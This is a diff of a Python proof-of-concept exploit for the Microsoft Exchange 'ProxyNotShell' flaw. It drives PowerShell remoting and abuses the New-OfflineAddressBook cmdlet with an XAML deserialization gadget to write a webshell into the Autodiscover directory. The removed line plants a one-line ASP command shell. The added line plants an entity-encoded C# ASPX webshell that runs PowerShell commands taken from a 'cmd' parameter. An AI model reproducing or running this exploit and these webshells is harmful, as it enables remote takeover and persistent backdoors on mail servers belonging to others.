@@ -18,13 +18,14 @@ import requests
 '''
 C:\Users\Adam\Desktop\ProxyNotShell-PoC-main\ProxyNotShell-PoC-main>python2 poc_aug3.py https://10.0.102.210 "VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==" 1
 '''
-proxies = {"https":"http://127.0.0.1:8080"}
+# proxies = {"https":"http://127.0.0.1:8080"}
+proxies = {}
 
 base_url = sys.argv[1]
 token=sys.argv[2]
 
 session = requests.Session()
- 
+
 
 def post_request(original_url, headers, data = None, cookies = {}):
 	headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
@@ -73,12 +74,12 @@ class BasePacket:
 			self.Flags,
 			struct.pack('>I', BlobLength),
 			Blob ])
-		return output 
+		return output
 
 	def deserialize(self, data):
 		total_len = len(data)
 
-		i = 0 
+		i = 0
 		self.ObjectId = struct.unpack('>Q', data[i:i+8])[0]
 		i = i + 8
 		self.FragmentId = struct.unpack('>Q', data[i:i+8])[0]
@@ -176,7 +177,7 @@ def create_powershell_shell(SessionId, RPID):
 		<p:OperationID s:mustUnderstand="false">uuid:{OperationID}</p:OperationID>
 		<p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
 		<w:OptionSet xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" s:mustUnderstand="true">
-		
+
 			<w:Option Name="protocolversion" MustComply="true">2.3</w:Option>
 		</w:OptionSet>
 		<w:OperationTimeout>PT180.000S</w:OperationTimeout>
@@ -243,7 +244,7 @@ def run_cmdlet_new_offlineaddressbook(SessionId, RPID, ShellId):
 					</Props>
 
 					<S>
-					<![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:s="clr-namespace:System;assembly=mscorlib" xmlns:io="clr-namespace:System.IO;assembly=mscorlib"><ObjectDataProvider x:Key="x" ObjectType="{x:Type io:File}" MethodName="WriteAllText"><ObjectDataProvider.MethodParameters><s:String>C:/Progra~1/Microsoft/Exchan~1/V15/ClientAccess/Autodiscover/1.aspx</s:String><s:String>&lt;%response.write&#40;CreateObject&#40;'WScript.Shell'&#41;.Exec&#40;Request.QueryString&#40;'cmd'&#41;&#41;.StdOut.Readall&#40;&#41;;%&gt;</s:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
+					<![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:s="clr-namespace:System;assembly=mscorlib" xmlns:io="clr-namespace:System.IO;assembly=mscorlib"><ObjectDataProvider x:Key="x" ObjectType="{x:Type io:File}" MethodName="WriteAllText"><ObjectDataProvider.MethodParameters><s:String>C:/Progra~1/Microsoft/Exchan~1/V15/ClientAccess/Autodiscover/fd.aspx</s:String><s:String>&#x3c;&#x25;&#x40;&#x20;&#x50;&#x61;&#x67;&#x65;&#x20;&#x4c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x43;&#x23;&#x22;&#x20;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x2e;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x4d;&#x6f;&#x64;&#x65;&#x6c;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x73;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x41;&#x73;&#x73;&#x65;&#x6d;&#x62;&#x6c;&#x79;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2c;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x31;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x30;&#x2c;&#x43;&#x75;&#x6c;&#x74;&#x75;&#x72;&#x65;&#x3d;&#x6e;&#x65;&#x75;&#x74;&#x72;&#x61;&#x6c;&#x2c;&#x50;&#x75;&#x62;&#x6c;&#x69;&#x63;&#x4b;&#x65;&#x79;&#x54;&#x6f;&#x6b;&#x65;&#x6e;&#x3d;&#x33;&#x31;&#x42;&#x46;&#x33;&#x38;&#x35;&#x36;&#x41;&#x44;&#x33;&#x36;&#x34;&#x45;&#x33;&#x35;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x68;&#x74;&#x6d;&#x6c;&#x3e;&#x0a;&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x4c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x63;&#x23;&#x22;&#x20;&#x72;&#x75;&#x6e;&#x61;&#x74;&#x3d;&#x22;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x22;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x74;&#x65;&#x20;&#x73;&#x74;&#x61;&#x74;&#x69;&#x63;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x20;&#x70;&#x6f;&#x77;&#x65;&#x72;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x65;&#x64;&#x28;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x20;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x54;&#x65;&#x78;&#x74;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x74;&#x72;&#x79;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x20;&#x3d;&#x20;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x46;&#x61;&#x63;&#x74;&#x6f;&#x72;&#x79;&#x2e;&#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x4f;&#x70;&#x65;&#x6e;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x50;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x3d;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x50;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x43;&#x6f;&#x6d;&#x6d;&#x61;&#x6e;&#x64;&#x73;&#x2e;&#x41;&#x64;&#x64;&#x53;&#x63;&#x72;&#x69;&#x70;&#x74;&#x28;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x54;&#x65;&#x78;&#x74;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x43;&#x6f;&#x6d;&#x6d;&#x61;&#x6e;&#x64;&#x73;&#x2e;&#x41;&#x64;&#x64;&#x28;&#x22;&#x4f;&#x75;&#x74;&#x2d;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3c;&#x50;&#x53;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x3e;&#x20;&#x72;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x73;&#x20;&#x3d;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x49;&#x6e;&#x76;&#x6f;&#x6b;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x43;&#x6c;&#x6f;&#x73;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x66;&#x6f;&#x72;&#x65;&#x61;&#x63;&#x68;&#x20;&#x28;&#x50;&#x53;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x6f;&#x62;&#x6a;&#x20;&#x69;&#x6e;&#x20;&#x72;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x73;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x2e;&#x41;&#x70;&#x70;&#x65;&#x6e;&#x64;&#x4c;&#x69;&#x6e;&#x65;&#x28;&#x6f;&#x62;&#x6a;&#x2e;&#x54;&#x6f;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x2e;&#x54;&#x6f;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x63;&#x61;&#x74;&#x63;&#x68;&#x28;&#x45;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x65;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x2e;&#x46;&#x6f;&#x72;&#x6d;&#x61;&#x74;&#x28;&#x22;&#x45;&#x72;&#x72;&#x6f;&#x72;&#x3a;&#x20;&#x7b;&#x30;&#x7d;&#x22;&#x2c;&#x20;&#x65;&#x78;&#x63;&#x65;&#x70;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x72;&#x6f;&#x74;&#x65;&#x63;&#x74;&#x65;&#x64;&#x20;&#x76;&#x6f;&#x69;&#x64;&#x20;&#x50;&#x61;&#x67;&#x65;&#x5f;&#x4c;&#x6f;&#x61;&#x64;&#x28;&#x6f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x73;&#x65;&#x6e;&#x64;&#x65;&#x72;&#x2c;&#x20;&#x45;&#x76;&#x65;&#x6e;&#x74;&#x41;&#x72;&#x67;&#x73;&#x20;&#x65;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x52;&#x65;&#x73;&#x70;&#x6f;&#x6e;&#x73;&#x65;&#x2e;&#x57;&#x72;&#x69;&#x74;&#x65;&#x28;&#x70;&#x6f;&#x77;&#x65;&#x72;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x65;&#x64;&#x28;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x2e;&#x50;&#x61;&#x72;&#x61;&#x6d;&#x73;&#x5b;&#x22;&#x63;&#x6d;&#x64;&#x22;&#x5d;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;</s:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
 					</S>
 
 				</Obj>
@@ -255,7 +256,7 @@ def run_cmdlet_new_offlineaddressbook(SessionId, RPID, ShellId):
 	print('[+] Create powershell pipeline')
 	c = PSCommand(3, RPID, PID, commandData)
 	command_arguments = base64.b64encode(c.serialize())
-	
+
 	MessageID = uuid.uuid4()
 	OperationID = uuid.uuid4()
 	request_data = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
